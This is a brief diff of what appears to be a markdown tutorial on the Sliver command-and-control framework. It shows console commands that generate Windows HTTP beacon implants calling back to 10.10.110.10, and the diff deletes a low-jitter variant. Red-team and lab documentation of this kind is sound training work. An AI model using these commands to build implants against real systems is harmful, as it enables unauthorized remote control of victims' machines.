@@ -111,7 +111,7 @@ sliver > help generate beacon
 sliver > generate beacon --http 10.10.110.10 --name httpbeacon80 --os windows
 
 # One with a low delay/jitter
-sliver > generate beacon --http 10.10.110.10 --name httpbeacon80fast --os windows --jitter 1 --seconds 5
+sliver > 
 ```
 
 ## Setting up a Listener
